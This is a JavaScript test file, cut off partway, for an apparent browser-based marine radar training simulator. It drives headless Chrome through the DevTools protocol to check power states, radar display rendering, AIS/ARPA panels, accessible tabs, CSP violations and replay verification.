import test from "node:test";
import assert from "node:assert/strict";
import {createHash} from "node:crypto";
import {spawn, spawnSync} from "node:child_process";
import {once} from "node:events";
import {existsSync} from "node:fs";
import {mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile} from "node:fs/promises";
import {createServer} from "node:net";
import os from "node:os";
import path from "node:path";
import {fileURLToPath, pathToFileURL} from "node:url";
import {
  buildStandaloneHtml,
  findModuleSpecifiers,
  tokenizeModule,
} from "../tools/build_mdc2060_standalone.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function freeLoopbackPort() {
  return new Promise((resolve, reject) => {
    const server = createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const port = server.address().port;
      server.close(() => resolve(port));
    });
  });
}

function findChromiumBinary() {
  const candidates = process.platform === "win32"
    ? [
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
      ]
    : [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
      ];
  return candidates.find(bin => existsSync(bin)) ?? null;
}

async function startLocalServer() {
  const port = await freeLoopbackPort();
  const origin = `http://127.0.0.1:${port}`;
  const child = spawn(process.execPath, ["tools/server.mjs"], {
    cwd: ROOT,
    env: {...process.env, PORT: String(port)},
    stdio: ["ignore", "pipe", "pipe"],
    windowsHide: true,
  });
  let exited = false;
  let stderr = "";
  child.once("exit", () => {
    exited = true;
  });
  child.stderr.on("data", bytes => {
    stderr += String(bytes);
  });

  try {
    let ready = false;
    for (let i = 0; i < 40; i += 1) {
      if (exited) {
        throw new Error(`server exited before readiness: ${stderr}`);
      }
      try {
        const res = await fetch(`${origin}/mdc2060`);
        ready = res.status === 200;
        if (ready) break;
      } catch {
        // retry until listening
      }
      await sleep(50);
    }
    assert.ok(ready, `local server failed to become ready on ${origin}: ${stderr}`);
  } catch (err) {
    if (!exited) {
      child.kill();
      await once(child, "exit").catch(() => {});
    }
    throw err;
  }

  return {
    port,
    origin,
    async close() {
      if (!exited) {
        child.kill();
        await once(child, "exit").catch(() => {});
      }
    },
  };
}

async function createMinimalBundleFixture(rootDir, {
  appSource = "export const ok = true;\n",
  stylesCss = "body { background: #000; }\n",
  extraFiles = [],
  includeCharset = true,
  minModules = 1,
} = {}) {
  await mkdir(path.join(rootDir, "web", "mdc2060"), {recursive: true});
  await mkdir(path.join(rootDir, "src"), {recursive: true});
  await writeFile(
    path.join(rootDir, "web", "favicon.svg"),
    "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 16 16\"></svg>\n",
    "utf8",
  );
  await writeFile(
    path.join(rootDir, "web", "mdc2060", "styles.css"),
    stylesCss,
    "utf8",
  );
  await writeFile(
    path.join(rootDir, "web", "mdc2060", "index.html"),
    [
      "<!doctype html>",
      "<html lang=\"vi\">",
      "<head>",
      ...(includeCharset ? ["  <meta charset=\"utf-8\">"] : []),
      "  <link rel=\"icon\" type=\"image/svg+xml\" href=\"/web/favicon.svg\">",
      "  <link rel=\"stylesheet\" href=\"/web/mdc2060/styles.css\">",
      "  <script type=\"module\" src=\"/web/mdc2060/app.mjs\"></script>",
      "</head>",
      "<body></body>",
      "</html>",
    ].join("\n"),
    "utf8",
  );

  let finalAppSource = appSource;
  if (minModules > 1) {
    const depImports = [];
    for (let idx = 1; idx < minModules; idx += 1) {
      const depName = `_dep_${idx}.mjs`;
      await writeFile(
        path.join(rootDir, "web", "mdc2060", depName),
        `export const depValue${idx} = ${idx};\n`,
        "utf8",
      );
      depImports.push(`import {depValue${idx}} from "./${depName}";`);
    }
    finalAppSource = `${depImports.join("\n")}\n${appSource}`;
  }

  await writeFile(path.join(rootDir, "web", "mdc2060", "app.mjs"), finalAppSource, "utf8");
  for (const file of extraFiles) {
    const abs = path.join(rootDir, file.rel);
    await mkdir(path.dirname(abs), {recursive: true});
    await writeFile(abs, file.content, "utf8");
  }
}

function parseBatchCompoundBlocks(batSource) {
  const rawLines = batSource.split(/\r?\n/);
  const stack = [];
  const allBlocks = [];
  const lineMeta = [];

  for (let i = 0; i < rawLines.length; i += 1) {
    const lineNo = i + 1;
    const text = rawLines[i];
    const trimmed = text.trim();
    const isComment = /^rem(?:\s|$)/i.test(trimmed) || trimmed.startsWith("::");
    const leadingClose = !isComment && trimmed.startsWith(")");
    const enclosingBefore = leadingClose ? stack.slice(0, -1) : stack.slice();

    lineMeta.push({
      lineNo,
      text,
      trimmed,
      depth: enclosingBefore.length,
      enclosingBlocks: enclosingBefore,
    });

    if (isComment) {
      for (const blk of stack) blk.lines.push({lineNo, text, trimmed});
      continue;
    }

    for (const blk of enclosingBefore) {
      blk.lines.push({lineNo, text, trimmed});
    }

    let inQuotes = false;
    for (let c = 0; c < text.length; c += 1) {
      const ch = text[c];
      if (ch === "^" && !inQuotes && c + 1 < text.length) {
        c += 1;
        continue;
      }
      if (ch === "\"") {
        inQuotes = !inQuotes;
        continue;
      }
      if (!inQuotes) {
        if (ch === "(") {
          const blk = {startLine: lineNo, endLine: null, header: trimmed, lines: [{lineNo, text, trimmed}]};
          stack.push(blk);
          allBlocks.push(blk);
        } else if (ch === ")") {
          const closed = stack.pop();
          if (!closed) {
            throw new Error(`Unbalanced ')' on line ${lineNo}: ${text}`);
          }
          closed.endLine = lineNo;
        }
      }
    }
  }

  return {finalDepth: stack.length, blocks: allBlocks, lines: lineMeta};
}

async function runHeadlessMdc2060Scenario(targetUrl, browserBin, {checkNetwork = false} = {}) {
  const userDataDir = await mkdtemp(path.join(os.tmpdir(), "mdc2060-cdp-"));
  const chrome = spawn(
    browserBin,
    [
      "--headless=new",
      "--no-sandbox",
      "--disable-gpu",
      "--disable-dev-shm-usage",
      "--disable-extensions",
      "--disable-background-networking",
      "--no-first-run",
      "--no-default-browser-check",
      "--remote-debugging-port=0",
      `--user-data-dir=${userDataDir}`,
      "about:blank",
    ],
    {stdio: ["ignore", "pipe", "pipe"], windowsHide: true},
  );

  let ws = null;
  let pageLoadedTimer = null;
  let onChromeExit = null;
  try {
    const wsBrowserUrl = await new Promise((resolve, reject) => {
      let stderr = "";
      const timer = setTimeout(() => {
        chrome.stderr.off("data", onData);
        chrome.off("exit", onEarlyExit);
        reject(new Error(`Timed out waiting for DevTools WebSocket:\n${stderr}`));
      }, 15000);
      const onData = chunk => {
        stderr += chunk.toString();
        const match = stderr.match(/DevTools listening on (ws:\/\/[^\s]+)/);
        if (match) {
          clearTimeout(timer);
          chrome.stderr.off("data", onData);
          chrome.off("exit", onEarlyExit);
          resolve(match[1]);
        }
      };
      const onEarlyExit = code => {
        clearTimeout(timer);
        chrome.stderr.off("data", onData);
        reject(new Error(`Browser exited early (${code}):\n${stderr}`));
      };
      chrome.stderr.on("data", onData);
      chrome.once("exit", onEarlyExit);
    });

    const debugPort = new URL(wsBrowserUrl).port;
    const targets = await fetch(`http://127.0.0.1:${debugPort}/json/list`).then(r => r.json());
    const pageTarget = targets.find(t => t.type === "page");
    assert.ok(pageTarget?.webSocketDebuggerUrl, "Expected CDP page target");

    ws = new WebSocket(pageTarget.webSocketDebuggerUrl);
    await new Promise((resolve, reject) => {
      const onOpen = () => {
        ws.removeEventListener("error", onErr);
        resolve();
      };
      const onErr = err => {
        ws.removeEventListener("open", onOpen);
        reject(err instanceof Error ? err : new Error("CDP WebSocket failed to connect"));
      };
      ws.addEventListener("open", onOpen, {once: true});
      ws.addEventListener("error", onErr, {once: true});
    });

    let nextId = 1;
    const pending = new Map();
    const consoleErrors = [];
    const pageErrors = [];
    const logErrors = [];
    const networkErrors = [];
    let markLoaded = null;
    let rejectPageLoaded = null;
    let pageLoadSettled = false;

    const clearPageLoadedTimer = () => {
      if (pageLoadedTimer !== null) {
        clearTimeout(pageLoadedTimer);
        pageLoadedTimer = null;
      }
    };

    const failInFlight = reason => {
      const err = reason instanceof Error ? reason : new Error(String(reason));
      if (!pageLoadSettled) {
        pageLoadSettled = true;
        clearPageLoadedTimer();
        rejectPageLoaded?.(err);
      }
      for (const [, entry] of pending) {
        entry.reject(err);
      }
      pending.clear();
    };

    const pageLoaded = new Promise((resolve, reject) => {
      rejectPageLoaded = reject;
      pageLoadedTimer = setTimeout(() => {
        if (pageLoadSettled) return;
        pageLoadSettled = true;
        pageLoadedTimer = null;
        reject(new Error(`Timed out waiting for loadEventFired on ${targetUrl}`));
      }, 15000);
      markLoaded = () => {
        if (pageLoadSettled) return;
        pageLoadSettled = true;
        clearPageLoadedTimer();
        resolve();
      };
    });
    // Ensure early exception before `await pageLoaded` cannot trigger an unhandled rejection
    pageLoaded.catch(() => {});

    onChromeExit = (code, signal) => {
      failInFlight(`Headless browser exited unexpectedly (code=${code}, signal=${signal})`);
    };
    chrome.once("exit", onChromeExit);
    ws.addEventListener("close", () => {
      failInFlight("CDP WebSocket closed while commands were in flight");
    });
    ws.addEventListener("error", () => {
      failInFlight("CDP WebSocket error while commands were in flight");
    });

    ws.onmessage = event => {
      const msg = JSON.parse(String(event.data));
      if (msg.id && pending.has(msg.id)) {
        const entry = pending.get(msg.id);
        pending.delete(msg.id);
        if (msg.error) entry.reject(new Error(JSON.stringify(msg.error)));
        else entry.resolve(msg.result);
        return;
      }
      if (msg.method === "Runtime.exceptionThrown") {
        const d = msg.params?.exceptionDetails;
        pageErrors.push(d?.exception?.description || d?.text || JSON.stringify(d));
      } else if (msg.method === "Runtime.consoleAPICalled" && msg.params?.type === "error") {
        consoleErrors.push(
          (msg.params.args ?? []).map(a => a.value ?? a.description ?? "").join(" "),
        );
      } else if (msg.method === "Log.entryAdded" && msg.params?.entry?.level === "error") {
        const entry = msg.params.entry;
        logErrors.push(`${entry.source}: ${entry.text}`);
      } else if (checkNetwork && msg.method === "Network.loadingFailed" && !msg.params?.canceled) {
        networkErrors.push(`loadingFailed: ${msg.params?.errorText ?? "unknown"} (${msg.params?.type ?? ""})`);
      } else if (checkNetwork && msg.method === "Network.responseReceived" && (msg.params?.response?.status ?? 0) >= 400) {
        networkErrors.push(`HTTP ${msg.params.response.status}: ${msg.params.response.url}`);
      } else if (msg.method === "Page.loadEventFired") {
        markLoaded?.();
      }
    };

    const send = (method, params = {}) => {
      if (ws.readyState !== WebSocket.OPEN) {
        return Promise.reject(new Error(`Cannot send CDP ${method}: WebSocket is not open`));
      }
      const id = nextId++;
      ws.send(JSON.stringify({id, method, params}));
      return new Promise((resolve, reject) => pending.set(id, {resolve, reject}));
    };

    await send("Page.enable");
    await send("Runtime.enable");
    await send("Log.enable");
    if (checkNetwork) {
      await send("Network.enable");
    }
    await send("Emulation.setDeviceMetricsOverride", {
      width: 1450,
      height: 920,
      deviceScaleFactor: 1,
      mobile: false,
    });
    await send("Page.addScriptToEvaluateOnNewDocument", {
      source: `
        window.__mdc2060CspViolations = [];
        window.addEventListener("securitypolicyviolation", (event) => {
          window.__mdc2060CspViolations.push(
            (event.violatedDirective || event.effectiveDirective || "csp") + ":" + (event.blockedURI || "")
          );
        });
      `,
    });

    await send("Page.navigate", {url: targetUrl});
    await pageLoaded;

    const evalRes = await send("Runtime.evaluate", {
      returnByValue: true,
      awaitPromise: true,
      expression: `(async () => {
        const nextFrames = (n = 2) => new Promise(resolve => {
          const step = rem => (rem <= 0 ? resolve() : requestAnimationFrame(() => step(rem - 1)));
          step(n);
        });
        const byId = id => {
          const el = document.getElementById(id);
          if (!el) throw new Error("Missing element #" + id);
          return el;
        };
        const diffPixels = (a, b, threshold = 12) => {
          let changed = 0;
          for (let i = 0; i < a.length; i += 4) {
            if (
              Math.abs(a[i] - b[i]) +
              Math.abs(a[i + 1] - b[i + 1]) +
              Math.abs(a[i + 2] - b[i + 2]) > threshold
            ) {
              changed += 1;
            }
          }
          return changed;
        };
        const countCyanInRows = (data, width, yStart, yEnd) => {
          let count = 0;
          for (let y = yStart; y <= yEnd; y += 1) {
            for (let x = 0; x < width; x += 1) {
              const i = (y * width + x) * 4;
              const r = data[i];
              const g = data[i + 1];
              const b = data[i + 2];
              if (g >= 175 && b >= 190 && r <= 105 && (g - r) >= 85) {
                count += 1;
              }
            }
          }
          return count;
        };

        // Wait for 30-module boot & D15 tabs initialization
        const deadline = Date.now() + 5000;
        while (Date.now() < deadline) {
          if (document.querySelector(".training-panel")?.dataset.d15TabsReady === "true") break;
          await new Promise(r => setTimeout(r, 25));
        }
        const tabsReady = document.querySelector(".training-panel")?.dataset.d15TabsReady === "true";
        if (!tabsReady) throw new Error("MDC-2060 app did not finish booting (data-d15-tabs-ready !== true)");
        await nextFrames(2);

        const canvas = byId("ppi-canvas");
        const ctx = canvas.getContext("2d", {willReadFrequently: true});
        if (!ctx) throw new Error("Unable to get 2d context for #ppi-canvas");

        // Step 0: OFF baseline
        const offBaseline = {
          protocol: location.protocol,
          canvasWidth: canvas.width,
          canvasHeight: canvas.height,
          bannerText: document.querySelector('.public-reference-banner[role="note"]')?.textContent?.trim() ?? "",
          offHidden: byId("off-screen").hidden,
          txLed: byId("tx-led").dataset.state,
          statPower: byId("stat-power").textContent?.trim(),
          stripPower: byId("strip-power-state").textContent?.trim(),
          fastPreheatChecked: byId("chk-fast-preheat").checked,
          skipPreheatDisabled: byId("btn-skip-preheat").disabled,
        };
        const offDisk = new Uint8ClampedArray(ctx.getImageData(30, 90, 420, 420).data);

        // Step 1: Power ON -> Preheat -> Skip Preheat -> ST'BY -> TX -> Animated PPI
        byId("btn-power").click();
        const preheatState = {
          offHidden: byId("off-screen").hidden,
          txLed: byId("tx-led").dataset.state,
          statPower: byId("stat-power").textContent?.trim(),
          stripPower: byId("strip-power-state").textContent?.trim(),
          skipPreheatDisabled: byId("btn-skip-preheat").disabled,
        };

        byId("btn-skip-preheat").click();
        const standbyState = {
          txLed: byId("tx-led").dataset.state,
          statPower: byId("stat-power").textContent?.trim(),
          stripPower: byId("strip-power-state").textContent?.trim(),
          skipPreheatDisabled: byId("btn-skip-preheat").disabled,
        };

        byId("btn-stby-tx").click();
        const txState = {
          txLed: byId("tx-led").dataset.state,
          statPower: byId("stat-power").textContent?.trim(),
          stripPower: byId("strip-power-state").textContent?.trim(),
          statRange: byId("stat-range").textContent?.trim(),
          stripTelemetry: byId("strip-telemetry").textContent?.trim(),
        };

        // Prove non-blank canvas vs OFF AND live animated sweep while unpaused
        await nextFrames(2);
        const txDisk1 = new Uint8ClampedArray(ctx.getImageData(30, 90, 420, 420).data);
        const nonBlankPixels = diffPixels(offDisk, txDisk1, 12);

        await new Promise(r => setTimeout(r, 200));
        await nextFrames(3);
        const txDisk2 = new Uint8ClampedArray(ctx.getImageData(30, 90, 420, 420).data);
        const animatedDiffPixels = diffPixels(txDisk1, txDisk2, 12);

        // Pause background sweep/timer for deterministic subsequent pixel checks
        byId("btn-pause").click();
        const pauseLabel = byId("btn-pause").textContent?.trim();
        await nextFrames(2);

        // Step 2: EBL1 & VRM1 activation via MENU > EBL/VRM + readout dynamics
        const eblBefore = new Uint8ClampedArray(ctx.getImageData(6, 512, 144, 28).data);
        const eblCyanBeforeRow1 = countCyanInRows(eblBefore, 144, 0, 13);
        const eblCyanBeforeRow2 = countCyanInRows(eblBefore, 144, 14, 27);

        byId("btn-menu").click();
        byId("pad-right").click();
        byId("pad-right").click();
        byId("btn-ent").click();
        byId("pad-right").click();
        byId("btn-ent").click();
        byId("pad-down").click();
        byId("pad-down").click();
        byId("btn-ent").click();
        byId("pad-right").click();
        byId("btn-ent").click();
        byId("btn-menu").click();
        await nextFrames(2);

        const eblAfter = new Uint8ClampedArray(ctx.getImageData(6, 512, 144, 28).data);
        const eblToggleDiff = diffPixels(eblBefore, eblAfter, 12);
        const eblCyanAfterRow1 = countCyanInRows(eblAfter, 144, 0, 13);
        const eblCyanAfterRow2 = countCyanInRows(eblAfter, 144, 14, 27);

        for (let i = 0; i < 4; i += 1) byId("pad-right").click();
        for (let i = 0; i < 4; i += 1) byId("pad-up").click();
        await nextFrames(2);
        const eblMoved = new Uint8ClampedArray(ctx.getImageData(6, 512, 144, 28).data);
        const eblMoveDiff = diffPixels(eblAfter, eblMoved, 12);

        // Step 3: ATA & AIS inspection on Tab 3 (#d15-tab-arpa)
        byId("d15-tab-arpa").click();
        const arpaPanelHidden = byId("d15-panel-arpa").hidden;
        const aisCountSummary = byId("ais-count-summary").textContent?.trim();
        const aisButtons = [...document.querySelectorAll("#ais-target-list button.target-item")];
        const aisListText = byId("ais-target-list").textContent ?? "";

        byId("btn-ata-acq").click();
        const ataItems = [...document.querySelectorAll("#ata-target-list .target-item")];
        const ataFirstText = ataItems[0]?.textContent?.trim() ?? "";
        const stripTelemetryAfterAta = byId("strip-telemetry").textContent?.trim() ?? "";

        for (let i = 0; i < 6; i += 1) byId("btn-step").click();
        const nmeaAfterStabilize = byId("nmea-monitor").textContent ?? "";

        await nextFrames(2);
        const aisModalBefore = new Uint8ClampedArray(ctx.getImageData(44, 150, 392, 286).data);
        aisButtons[0].click();
        const selectedAisFound = document.querySelector('#ais-target-list button.target-item[data-selected="true"]') !== null;
        await nextFrames(2);
        const aisModalAfter = new Uint8ClampedArray(ctx.getImageData(44, 150, 392, 286).data);
        const aisModalDiff = diffPixels(aisModalBefore, aisModalAfter, 12);

        // Close AIS INFO modal before menu navigation
        byId("btn-ent").click();
        await nextFrames(2);

        // Step 4: PPI/PPI & PPI/NAV screen switches via MENU > DISPLAY > SCREEN
        const lowerPpi = new Uint8ClampedArray(ctx.getImageData(20, 380, 440, 200).data);

        const advanceScreenMode = () => {
          byId("btn-menu").click();
          byId("pad-right").click();
          byId("pad-down").click();
          byId("pad-down").click();
          byId("btn-ent").click();
          byId("pad-right").click();
          byId("btn-ent").click();
          byId("btn-menu").click();
        };

        advanceScreenMode();
        const dualStripPower = byId("strip-power-state").textContent?.trim();
        await nextFrames(2);
        const lowerDual = new Uint8ClampedArray(ctx.getImageData(20, 380, 440, 200).data);
        const dualScreenDiff = diffPixels(lowerPpi, lowerDual, 12);

        byId("btn-sub-range-up").click();
        const subRangeAfterUp = byId("sub-range-readout").textContent?.trim();

        advanceScreenMode();
        const navStripPower = byId("strip-power-state").textContent?.trim();
        await nextFrames(2);
        const lowerNav = new Uint8ClampedArray(ctx.getImageData(20, 380, 440, 200).data);
        const navVsDualDiff = diffPixels(lowerDual, lowerNav, 12);
        const navVsPpiDiff = diffPixels(lowerPpi, lowerNav, 12);

        // Step 5: D15 5 WAI-ARIA tabs (click + ArrowRight / End / Home)
        const tablistHidden = document.querySelector(".d15-tablist")?.hidden ?? true;
        const tabs = [...document.querySelectorAll('.d15-tablist [role="tab"]')];
        const panels = [...document.querySelectorAll('.d15-tabpanels > [role="tabpanel"]')];
        const tabClickResults = [];
        for (let i = 0; i < tabs.length; i += 1) {
          tabs[i].click();
          const allSelectedOk = tabs.every((tab, j) => tab.getAttribute("aria-selected") === String(j === i));
          const allTabIndexOk = tabs.every((tab, j) => tab.tabIndex === (j === i ? 0 : -1));
          const allPanelsOk = panels.every((panel, j) => panel.hidden === (j !== i));
          tabClickResults.push({index: i, allSelectedOk, allTabIndexOk, allPanelsOk});
        }

        tabs[0].click();
        tabs[0].focus();
        tabs[0].dispatchEvent(new KeyboardEvent("keydown", {key: "ArrowRight", bubbles: true, cancelable: true}));
        const keyArrowRightOk =
          tabs[1].getAttribute("aria-selected") === "true" &&
          panels[1].hidden === false &&
          document.activeElement === tabs[1];

        tabs[1].dispatchEvent(new KeyboardEvent("keydown", {key: "End", bubbles: true, cancelable: true}));
        const keyEndOk =
          tabs[4].getAttribute("aria-selected") === "true" &&
          panels[4].hidden === false &&
          document.activeElement === tabs[4];

        tabs[4].dispatchEvent(new KeyboardEvent("keydown", {key: "Home", bubbles: true, cancelable: true}));
        const keyHomeOk =
          tabs[0].getAttribute("aria-selected") === "true" &&
          panels[0].hidden === false &&
          document.activeElement === tabs[0];

        // Step 6: Replay verification PASS on Tab 1
        byId("btn-verify-replay").click();
        const replayState = {
          datasetState: byId("replay-status").dataset.state ?? "",
          text: byId("replay-status").textContent?.trim() ?? "",
          eventCount: Number(byId("stat-events").textContent?.trim() ?? "0"),
        };

        return {
          offBaseline,
          preheatState,
          standbyState,
          txState,
          nonBlankPixels,
          animatedDiffPixels,
          pauseLabel,
          ebl: {
            eblCyanBeforeRow1,
            eblCyanBeforeRow2,
            eblToggleDiff,
            eblCyanAfterRow1,
            eblCyanAfterRow2,
            eblMoveDiff,
          },
          arpa: {
            arpaPanelHidden,
            aisCountSummary,
            aisButtonCount: aisButtons.length,
            aisListText,
            ataItemCount: ataItems.length,
            ataFirstText,
            stripTelemetryAfterAta,
            nmeaAfterStabilize,
            selectedAisFound,
            aisModalDiff,
          },
          screens: {
            dualStripPower,
            dualScreenDiff,
            subRangeAfterUp,
            navStripPower,
            navVsDualDiff,
            navVsPpiDiff,
          },
          tabs: {
            tablistHidden,
            tabCount: tabs.length,
            panelCount: panels.length,
            tabClickResults,
            keyArrowRightOk,
            keyEndOk,
            keyHomeOk,
          },
          replayState,
          cspViolations: window.__mdc2060CspViolations ?? [],
        };
      })()`,
    });

    if (evalRes.exceptionDetails) {
      throw new Error(`Renderer evaluation threw: ${JSON.stringify(evalRes.exceptionDetails)}`);
    }

    return {
      result: evalRes.result.value,
      consoleErrors,
      pageErrors,
      logErrors,
      networkErrors,
    };
  } finally {
    if (pageLoadedTimer !== null) {
      clearTimeout(pageLoadedTimer);
      pageLoadedTimer = null;
    }
    if (onChromeExit) {
      chrome.off("exit", onChromeExit);
      onChromeExit = null;
    }
    try {
      ws?.close();
    } catch {
      // ignore close errors
    }
    if (chrome.exitCode === null && chrome.signalCode === null) {
      chrome.kill("SIGKILL");
      await once(chrome, "exit").catch(() => {});
    }
    await rm(userDataDir, {recursive: true, force: true, maxRetries: 5, retryDelay: 100});
  }
}

function assertChromeMdc2060Run(run, expectedProtocol, label) {
  const {result, consoleErrors, pageErrors, logErrors, networkErrors} = run;
  assert.deepEqual(pageErrors, [], `${label}: unexpected page errors: ${pageErrors.join("; ")}`);
  assert.deepEqual(consoleErrors, [], `${label}: unexpected console errors: ${consoleErrors.join("; ")}`);
  assert.deepEqual(logErrors, [], `${label}: unexpected log/CSP errors: ${logErrors.join("; ")}`);
  assert.deepEqual(result.cspViolations, [], `${label}: unexpected CSP violations: ${result.cspViolations.join("; ")}`);
  assert.deepEqual(networkErrors, [], `${label}: unexpected network errors: ${networkErrors.join("; ")}`);

  // Step 0: OFF baseline
  assert.equal(result.offBaseline.protocol, expectedProtocol);
  assert.equal(result.offBaseline.canvasWidth, 480);
  assert.equal(result.offBaseline.canvasHeight, 640);
  assert.equal(
    result.offBaseline.bannerText,
    "PUBLIC REFERENCE / NOT HARDWARE VALIDATED / TRAINING ONLY",
  );
  assert.equal(result.offBaseline.offHidden, false);
  assert.equal(result.offBaseline.txLed, "off");
  assert.equal(result.offBaseline.statPower, "OFF");
  assert.equal(result.offBaseline.stripPower, "OFF · H-UP · PPI");
  assert.equal(result.offBaseline.fastPreheatChecked, true);
  assert.equal(result.offBaseline.skipPreheatDisabled, true);

  // Step 1: Power ON -> Preheat -> Skip -> ST'BY -> TX -> Animated Non-Blank PPI
  assert.equal(result.preheatState.offHidden, true);
  assert.equal(result.preheatState.txLed, "preheat");
  assert.equal(result.preheatState.statPower, "PREHEAT");
  assert.equal(result.preheatState.stripPower, "PREHEAT · H-UP · PPI");
  assert.equal(result.preheatState.skipPreheatDisabled, false);

  assert.equal(result.standbyState.txLed, "standby");
  assert.equal(result.standbyState.statPower, "ST'BY");
  assert.equal(result.standbyState.stripPower, "ST'BY · H-UP · PPI");
  assert.equal(result.standbyState.skipPreheatDisabled, true);

  assert.equal(result.txState.txLed, "transmit");
  assert.equal(result.txState.statPower, "TX");
  assert.equal(result.txState.stripPower, "TX · H-UP · PPI");
  assert.equal(result.txState.statRange, "6 NM");
  assert.match(result.txState.stripTelemetry, /Thang 6 NM/);
  assert.match(result.txState.stripTelemetry, /AIS 6/);

  assert.ok(
    result.nonBlankPixels > 5000,
    `${label}: expected > 5000 non-blank PPI pixels in TX, got ${result.nonBlankPixels}`,
  );
  assert.ok(
    result.animatedDiffPixels > 200,
    `${label}: expected > 200 animated sweep diff pixels in TX, got ${result.animatedDiffPixels}`,
  );
  assert.equal(result.pauseLabel, "Tiếp tục");

  // Step 2: EBL1 & VRM1 readout activation & cursor update
  assert.equal(result.ebl.eblCyanBeforeRow1, 0);
  assert.equal(result.ebl.eblCyanBeforeRow2, 0);
  assert.ok(result.ebl.eblToggleDiff > 40, `${label}: expected EBL/VRM toggle diff > 40, got ${result.ebl.eblToggleDiff}`);
  assert.ok(
    result.ebl.eblCyanAfterRow1 > 20,
    `${label}: expected bright cyan EBL1 readout pixels > 20, got ${result.ebl.eblCyanAfterRow1}`,
  );
  assert.ok(
    result.ebl.eblCyanAfterRow2 > 20,
    `${label}: expected bright cyan VRM1 readout pixels > 20, got ${result.ebl.eblCyanAfterRow2}`,
  );
  assert.ok(result.ebl.eblMoveDiff > 20, `${label}: expected EBL/VRM move diff > 20, got ${result.ebl.eblMoveDiff}`);

  // Step 3: ATA & AIS inspection
  assert.equal(result.arpa.arpaPanelHidden, false);
  assert.equal(result.arpa.aisCountSummary, "6/6");
  assert.equal(result.arpa.aisButtonCount, 6);
  assert.match(result.arpa.aisListText, /PACIFIC STAR/);
  assert.match(result.arpa.aisListText, /574002101/);
  assert.equal(result.arpa.ataItemCount, 1);
  assert.match(result.arpa.ataFirstText, /T01 ·/);
  assert.match(result.arpa.ataFirstText, /BRG /);
  assert.match(result.arpa.ataFirstText, /RNG /);
  assert.match(result.arpa.ataFirstText, /CPA /);
  assert.match(result.arpa.stripTelemetryAfterAta, /ATA 1/);
  assert.match(result.arpa.nmeaAfterStabilize, /\$RATTM,01,/);
  assert.equal(result.arpa.selectedAisFound, true);
  assert.ok(
    result.arpa.aisModalDiff > 5000,
    `${label}: expected AIS INFO modal diff > 5000, got ${result.arpa.aisModalDiff}`,
  );

  // Step 4: PPI/PPI & PPI/NAV screen switches
  assert.equal(result.screens.dualStripPower, "TX · H-UP · PPI/PPI");
  assert.ok(
    result.screens.dualScreenDiff > 5000,
    `${label}: expected PPI/PPI lower-half diff > 5000, got ${result.screens.dualScreenDiff}`,
  );
  assert.equal(result.screens.subRangeAfterUp, "3 NM");
  assert.equal(result.screens.navStripPower, "TX · H-UP · PPI/NAV");
  assert.ok(
    result.screens.navVsDualDiff > 5000,
    `${label}: expected PPI/NAV vs PPI/PPI lower-half diff > 5000, got ${result.screens.navVsDualDiff}`,
  );
  assert.ok(
    result.screens.navVsPpiDiff > 5000,
    `${label}: expected PPI/NAV vs PPI lower-half diff > 5000, got ${result.screens.navVsPpiDiff}`,
  );

  // Step 5: D15 5 WAI-ARIA tabs
  assert.equal(result.tabs.tablistHidden, false);
  assert.equal(result.tabs.tabCount, 5);
  assert.equal(result.tabs.panelCount, 5);
  for (const row of result.tabs.tabClickResults) {
    assert.equal(row.allSelectedOk, true, `${label}: tab ${row.index} aria-selected mismatch`);
    assert.equal(row.allTabIndexOk, true, `${label}: tab ${row.index} tabIndex mismatch`);
    assert.equal(row.allPanelsOk, true, `${label}: tab ${row.index} tabpanel hidden mismatch`);
  }
  assert.equal(result.tabs.keyArrowRightOk, true);
  assert.equal(result.tabs.keyEndOk, true);
  assert.equal(result.tabs.keyHomeOk, true);

  // Step 6: Replay verification PASS
  assert.equal(result.replayState.datasetState, "pass");
  assert.match(
    result.replayState.text,
    /^REPLAY PASS \(\d+ sự kiện · f0-fnv1a32-[0-9a-f]{7}\)$/,
  );
  assert.ok(result.replayState.eventCount >= 20);
}

test("web/mdc2060 DOM, ARIA, MRD-104 controls, security invariants, and FCV-588 isolation hold", async () => {
  const html = await readFile(path.join(ROOT, "web/mdc2060/index.html"), "utf8");

  assert.match(html, /^<!doctype html>/i);
  assert.match(html, /<meta\s+charset="utf-8">/i);
  assert.doesNotMatch(html, /http-equiv=["']Content-Security-Policy["']/i);
  assert.match(html, /<link\s+rel="icon"\s+type="image\/svg\+xml"\s+href="\/web\/favicon\.svg">/);
  assert.match(html, /<link\s+rel="stylesheet"\s+href="\/web\/mdc2060\/styles\.css">/);
  assert.match(html, /<script\s+type="module"\s+src="\/web\/mdc2060\/app\.mjs"><\/script>/);

  // Mandatory public reference banner & footer disclaimer
  assert.match(
    html,
    /<div\s+class="public-reference-banner"\s+role="note"\s+lang="en">PUBLIC REFERENCE \/ NOT HARDWARE VALIDATED \/ TRAINING ONLY<\/div>/,
  );
  assert.match(html, /<p\s+class="disclaimer">[\s\S]*?NMEA-0183[\s\S]*?<\/p>/);

  // Recessed 480x640 canvas (no aria-live on canvas) & off-screen veil
  const canvasTag = html.match(/<canvas\b[^>]*id="ppi-canvas"[^>]*>/);
  assert.ok(canvasTag, "Missing #ppi-canvas tag");
  assert.match(canvasTag[0], /\bwidth="480"/);
  assert.match(canvasTag[0], /\bheight="640"/);
  assert.match(canvasTag[0], /\brole="img"/);
  assert.doesNotMatch(canvasTag[0], /\baria-live=/i);
  assert.match(html, /id="off-screen"/);

  // 4 workspace toolbar controls
  for (const id of ["device-focus-toggle", "btn-audio-toggle", "btn-fullscreen", "btn-lang-toggle"]) {
    assert.ok(html.includes(`id="${id}"`), `Missing toolbar control #${id}`);
  }

  // All 10 physical MRD-104 control groups
  for (const marker of [
    'id="btn-f1"', 'data-control="f1"',
    'id="btn-f2"', 'data-control="f2"',
    'id="btn-menu"', 'data-control="menu"',
